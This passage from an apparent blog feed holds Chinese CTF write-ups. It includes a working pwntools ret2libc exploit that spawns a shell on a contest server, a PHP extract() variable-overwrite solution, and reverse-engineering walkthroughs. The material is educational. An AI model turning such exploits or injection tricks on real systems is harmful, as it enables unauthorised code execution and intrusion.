puts_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh<span class="token operator">=</span>next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
system<span class="token operator">=</span>system<span class="token operator">-</span>puts_libc<span class="token operator">+</span>puts
binsh<span class="token operator">=</span>binsh<span class="token operator">-</span>puts_libc<span class="token operator">+</span>puts
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>由于之前提供错了libc 自己远程recv也写错了2333<br>北邮面试完回来修改得到<br>远程EXP</p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true"># coding=utf-8</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>

<span class="token comment" spellcheck="true">#p=process('./pwn1')</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'45.40.195.20'</span><span class="token punctuation">,</span><span class="token number">23333</span><span class="token punctuation">)</span>
libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc6-i386_2.23-0ubuntu10_amd64.so'</span><span class="token punctuation">)</span>
elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./pwn1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'1'</span><span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
puts_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x0804857b</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>

p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>  <span class="token operator">//</span>多加了这里
puts<span class="token operator">=</span>u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'puts addr = '</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts<span class="token punctuation">)</span><span class="token punctuation">)</span>
puts_libc<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
system<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh<span class="token operator">=</span>next<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
system<span class="token operator">=</span>system<span class="token operator">-</span>puts_libc<span class="token operator">+</span>puts
binsh<span class="token operator">=</span>binsh<span class="token operator">-</span>puts_libc<span class="token operator">+</span>puts
payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">44</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>得到flag<br><img src="/2018/06/12/全国中学生网络安全技术大赛-Writeup/15.jpg" alt="ida1"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h1&gt;&lt;h2 id=&quot;签到题&quot;&gt;&lt;a href=&quot;#签到题&quot; class=&quot;headerlink&quot; title=&quot;签到题&quot;&gt;&lt;/a&gt;签到
    
    </summary>
    
    
      <category term="writeup" scheme="http://iosmosis.github.io/tags/writeup/"/>
    
      <category term="WEB" scheme="http://iosmosis.github.io/tags/WEB/"/>
    
      <category term="msscstc" scheme="http://iosmosis.github.io/tags/msscstc/"/>
    
      <category term="PWN" scheme="http://iosmosis.github.io/tags/PWN/"/>
    
      <category term="MISC" scheme="http://iosmosis.github.io/tags/MISC/"/>
    
      <category term="西电网安杯" scheme="http://iosmosis.github.io/tags/%E8%A5%BF%E7%94%B5%E7%BD%91%E5%AE%89%E6%9D%AF/"/>
    
  </entry>
  
  <entry>
    <title>2018北邮自招复试-CTF-Writeup</title>
    <link href="http://iosmosis.github.io/2018/06/10/%E5%8C%97%E9%82%AE%E8%87%AA%E6%8B%9B%E5%A4%8D%E8%AF%95-CTF-Writeup/"/>
    <id>http://iosmosis.github.io/2018/06/10/北邮自招复试-CTF-Writeup/</id>
    <published>2018-06-10T13:41:48.000Z</published>
    <updated>2018-06-12T15:30:20.996Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p>右键查看网站源码</p>
<p></p><p class="code-caption" data-lang="html" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-html"><code class="language-html">
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>

        <span class="token comment" spellcheck="true">&lt;!--
        index.php
        &lt;?php     
        $flag='xxx';     
        extract($_GET);     
        if(isset($gift)){        
            $content=trim(file_get_contents($flag));
            if($gift==$content){ 
               echo'flag';     }
             else{       
               echo'flag has been encrypted';}   
             } 
        ?>
        --></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span>
</code></pre>
<p>发现hint 存在flag这个文件 读入到content<br>输入gift 如果 gift=content则输出flag<br>尝试访问</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>http://10.112.163.9:8888/web2/index.php?gift=
</code></pre><p>返回</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>Warning: file_get_contents(xxx): failed to open stream: No such file or directory in /var/www/html/web2/index.php on line 6
flag is OHCG{82s5r276o3006q2054048p6799op543q}
</code></pre><p>根据提示 flag has been encrypted<br>所以猜测flag被某种方式加密<br>猜测为凯撒加密<br>用工具爆破了一下</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>PIDH{82t5s276p3006r2054048q6799pq543r}

QJEI{82u5t276q3006s2054048r6799qr543s}

RKFJ{82v5u276r3006t2054048s6799rs543t}

SLGK{82w5v276s3006u2054048t6799st543u}

TMHL{82x5w276t3006v2054048u6799tu543v}

UNIM{82y5x276u3006w2054048v6799uv543w}

VOJN{82z5y276v3006x2054048w6799vw543x}

WPKO{82a5z276w3006y2054048x6799wx543y}

XQLP{82b5a276x3006z2054048y6799xy543z}

YRMQ{82c5b276y3006a2054048z6799yz543a}

ZSNR{82d5c276z3006b2054048a6799za543b}

ATOS{82e5d276a3006c2054048b6799ab543c}

BUPT{82f5e276b3006d2054048c6799bc543d} //flag

CVQU{82g5f276c3006e2054048d6799cd543e}

DWRV{82h5g276d3006f2054048e6799de543f}

EXSW{82i5h276e3006g2054048f6799ef543g}

FYTX{82j5i276f3006h2054048g6799fg543h}

GZUY{82k5j276g3006i2054048h6799gh543i}

HAVZ{82l5k276h3006j2054048i6799hi543j}

IBWA{82m5l276i3006k2054048j6799ij543k}

JCXB{82n5m276j3006l2054048k6799jk543l}

KDYC{82o5n276k3006m2054048l6799kl543m}

LEZD{82p5o276l3006n2054048m6799lm543n}

MFAE{82q5p276m3006o2054048n6799mn543o}

NGBF{82r5q276n3006p2054048o6799no543p}

OHCG{82s5r276o3006q2054048p6799op543q}
</code></pre><p>因为提示flag格式为BUPT所以得到flag</p>
<p>BUPT{82f5e276b3006d2054048c6799bc543d}</p>
<h2 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h2><p>题目提示 1s中回答随机产生的数学题<br>运算符号不发生改变 所以用python先取出需要运算的数然后进行运算 最后post提交即可<br>EXP </p>
<p></p><p class="code-caption" data-lang="python" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> urllib2<span class="token punctuation">,</span> urllib

data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'v'</span> <span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">}</span>
f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>
        url     <span class="token operator">=</span> <span class="token string">'http://10.112.163.9:8888/web1/index.php'</span><span class="token punctuation">,</span>
        <span class="token comment" spellcheck="true">#data    = urllib.urlencode(data)</span>
  <span class="token punctuation">)</span>
res <span class="token operator">=</span> f<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>
temp <span class="token operator">=</span> str<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'&lt;br/>'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> temp
res1 <span class="token operator">=</span> temp<span class="token punctuation">[</span>len<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> res1
temp <span class="token operator">=</span> str<span class="token punctuation">(</span>res1<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'='</span><span class="token punctuation">)</span>
res2 <span class="token operator">=</span> temp<span class="token punctuation">[</span>len<span class="token punctuation">(</span>temp<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> res2
res <span class="token operator">=</span>res2
re1 <span class="token operator">=</span> str<span class="token punctuation">(</span>res<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'*'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> re1
a <span class="token operator">=</span> re1<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">]</span>
re2 <span class="token operator">=</span> re1<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>
re2 <span class="token operator">=</span> str<span class="token punctuation">(</span>re2<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> re2 
b <span class="token operator">=</span> re2<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> b
q <span class="token operator">=</span> int<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token operator">*</span>int<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
<span class="token keyword">print</span> q <span class="token operator">//</span>前两位相乘
c <span class="token operator">=</span> re2<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re2<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> c
re3 <span class="token operator">=</span> re1<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re1<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> re3
re3 <span class="token operator">=</span> str<span class="token punctuation">(</span>re3<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> re3
re3 <span class="token operator">=</span> re3<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re3<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>
re3 <span class="token operator">=</span> str<span class="token punctuation">(</span>re3<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">')'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> re3
re3 <span class="token operator">=</span> re3<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re3<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>
<span class="token keyword">print</span> re3
re3 <span class="token operator">=</span> str<span class="token punctuation">(</span>re3<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> re3
d <span class="token operator">=</span> int<span class="token punctuation">(</span>re3<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re3<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span>int<span class="token punctuation">(</span>re3<span class="token punctuation">[</span>len<span class="token punctuation">(</span>re3<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span> d <span class="token operator">//</span>括号里面的相加
p <span class="token operator">=</span> int<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">*</span>int<span class="token punctuation">(</span>d<span class="token punctuation">)</span>
<span class="token keyword">print</span> p <span class="token operator">//</span>括号外相乘
ss <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token operator">+</span>int<span class="token punctuation">(</span>q<span class="token punctuation">)</span>
<span class="token keyword">print</span> ss <span class="token operator">//</span>执行完整的运算
data <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'v'</span> <span class="token punctuation">:</span> ss<span class="token punctuation">}</span>
f <span class="token operator">=</span> urllib2<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>
        url     <span class="token operator">=</span> <span class="token string">'http://10.112.163.9:8888/web1/index.php'</span><span class="token punctuation">,</span>
        data    <span class="token operator">=</span> urllib<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
  <span class="token punctuation">)</span>
<span class="token keyword">print</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<p>运行即可获取flag<br>flag is BUPT{7b28f26afca4bc2654bd83d2a2bdc546}</p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Kaisa"><a href="#Kaisa" class="headerlink" title="Kaisa"></a>Kaisa</h2><p>运行程序开了下流程 需要输入flag 通过题目可知应该是凯撒加密题目<br>导入到IDA分析<br>shift+F12搜索字符串</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>.rdata:0040789E    0000000D    C    KERNEL32.dll
.data:00408035    00000023    C    FAE{Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?}
.data:00408058    00000017    C    Flag is your input!!!!
.data:00408074    00000014    C    input your flag?\n&gt;&gt;
.data:00408318    00000006    C     \t-\r]
</code></pre><p>发现一个特殊字符串 FAE{Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?}<br>通过交叉引用定位到关键函数</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>int result; // eax
char v9[64]; // [esp+Ch] [ebp-40h]

sub_4012C9(aInputYourFlag);
scanf(aS, v9);
v3 = strlen(v9);
v4 = 0;
if ( v3 &gt; 0 )
{
  v5 = byte_408030;
  do
  {
    v6 = v9[v4];
    if ( (unsigned __int8)v6 &lt; 0x61u || (unsigned __int8)v6 &gt; 0x7Au )
    {
      if ( (unsigned __int8)v6 &gt;= 0x41u &amp;&amp; (unsigned __int8)v6 &lt;= 0x5Au )
        v6 = (unsigned __int16)((unsigned __int8)(v6 + v5 - 65) % 26) + 65;
    }
    else
    {
      v6 = (unsigned __int16)((unsigned __int8)(v6 + v5 - 97) % 26) + 97;
    }
    v9[v4++] = v6;
  }
  while ( v4 &lt; v3 );
}
v7 = 0;
if ( v3 &lt;= 0 )
{
LABEL_13:
  sub_4012C9(aFlagIsYourInpu);
  if ( --stru_408088._cnt &lt; 0 )
    _filbuf(&amp;stru_408088);
  else
    ++stru_408088._ptr;
  if ( --stru_408088._cnt &lt; 0 )
    _filbuf(&amp;stru_408088);
  else
    ++stru_408088._ptr;
  result = 0;
}
else
{
  while ( v9[v7] == byte_408034[v7] )
  {
    if ( ++v7 &gt;= v3 )
      goto LABEL_13;
  }
  result = -1;
}
return result;
}
</code></pre><p>查看V5</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>.data:00408034 byte_408034     db &#39;M&#39;                  ; DATA XREF: _main+95↑r
.data:00408035 aFaeVl13lT3Gpcj db &#39;FAE{Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?}&#39;,0
.data:00408058 aFlagIsYourInpu db &#39;Flag is your input!!!!&#39;,0
</code></pre><p>找到密文 MFAE{Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?}<br>通过暴力跑位移得到flag</p>
<p></p><p class="code-caption" data-lang="" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre><code>NGBF{Wm1_3M_U3_hQDk_EymdF_D1Szu?!?}
OHCG{Xn1_3N_V3_iREl_FzneG_E1Tav?!?}
PIDH{Yo1_3O_W3_jSFm_GaofH_F1Ubw?!?}
QJEI{Zp1_3P_X3_kTGn_HbpgI_G1Vcx?!?}
RKFJ{Aq1_3Q_Y3_lUHo_IcqhJ_H1Wdy?!?}
SLGK{Br1_3R_Z3_mVIp_JdriK_I1Xez?!?}
TMHL{Cs1_3S_A3_nWJq_KesjL_J1Yfa?!?}
UNIM{Dt1_3T_B3_oXKr_LftkM_K1Zgb?!?}
VOJN{Eu1_3U_C3_pYLs_MgulN_L1Ahc?!?}
WPKO{Fv1_3V_D3_qZMt_NhvmO_M1Bid?!?}
XQLP{Gw1_3W_E3_rANu_OiwnP_N1Cje?!?}
YRMQ{Hx1_3X_F3_sBOv_PjxoQ_O1Dkf?!?}
ZSNR{Iy1_3Y_G3_tCPw_QkypR_P1Elg?!?}
ATOS{Jz1_3Z_H3_uDQx_RlzqS_Q1Fmh?!?}
BUPT{Ka1_3A_I3_vERy_SmarT_R1Gni?!?} //flag
CVQU{Lb1_3B_J3_wFSz_TnbsU_S1Hoj?!?}
DWRV{Mc1_3C_K3_xGTa_UoctV_T1Ipk?!?}
EXSW{Nd1_3D_L3_yHUb_VpduW_U1Jql?!?}
FYTX{Oe1_3E_M3_zIVc_WqevX_V1Krm?!?}
GZUY{Pf1_3F_N3_aJWd_XrfwY_W1Lsn?!?}
HAVZ{Qg1_3G_O3_bKXe_YsgxZ_X1Mto?!?}
IBWA{Rh1_3H_P3_cLYf_ZthyA_Y1Nup?!?}
JCXB{Si1_3I_Q3_dMZg_AuizB_Z1Ovq?!?}
KDYC{Tj1_3J_R3_eNAh_BvjaC_A1Pwr?!?}
LEZD{Uk1_3K_S3_fOBi_CwkbD_B1Qxs?!?}
MFAE{Vl1_3L_T3_gPCj_DxlcE_C1Ryt?!?}
</code></pre><p>得到flag BUPT{Ka1_3A_I3_vERy_SmarT_R1Gni?!?}</p>
<h2 id="simple"><a href="#simple" class="headerlink" title="simple"></a>simple</h2><p>载入IDA<br>分析了整个流程</p>
<p></p><p class="code-caption" data-lang="c" data-line_number="frontend" data-trim_indent="backend" data-label_position="outer" data-labels_left="" data-labels_right="" data-labels_copy=""><span class="code-caption-label"></span></p><p></p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// kr04_4</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// eax</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// esi</span>
  <span class="token keyword">char</span> v6<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// cl</span>
  <span class="token keyword">char</span> v7<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// al</span>
  <span class="token keyword">char</span> v8<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// al</span>
  <span class="token keyword">char</span> v9<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+4h] [ebp-34h]</span>
  <span class="token keyword">char</span> v10<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+5h] [ebp-33h]</span>
  <span class="token keyword">char</span> v11<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+24h] [ebp-14h]</span>
  <span class="token keyword">char</span> v12<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+35h] [ebp-3h]</span>

  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> 
  <span class="token function">memset</span><span class="token punctuation">(</span>v10<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x30u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v12 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  <span class="token function">sub_4012E9</span><span class="token punctuation">(</span>aPlzGiveMeYourF<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输出give me your flag</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span>aS<span class="token punctuation">,</span> <span class="token operator">&amp;</span>v9<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//输入v9</span>
  v3 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//v3 等于v9的长度+1</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">31</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断v9的长度是否大于31</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">signed</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">(</span>v3 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">40</span> <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">//判断v9的长度是否小于等于40</span>
    <span class="token punctuation">{</span>
      <span class="token function">sub_4012E9</span><span class="token punctuation">(</span>aOkYouCanContin<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//如果上面两个条件满足 则 输出 ok you can continue</span>
      i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span>
      <span class="token punctuation">{</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
          v6 <span class="token operator">=</span> byte_408054<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//定义了一个数组到v6</span>
          v7 <span class="token operator">=</span> byte_408030<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token number">16</span> <span class="token operator">*</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//执行运算得到v7</span>
          <span class="token operator">*</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v9 <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">!=</span> v6 <span class="token punctuation">)</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
          v8 <span class="token operator">=</span> v10<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v8 <span class="token punctuation">)</span>
            <span class="token keyword">goto</span> LABEL_10<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">sub_4012E9</span><span class="token punctuation">(</span>aNononoYourInpu<span class="token punctuation">)</span><span class="token punctuation">;</span>  
LABEL_10<span class="token punctuation">:</span>
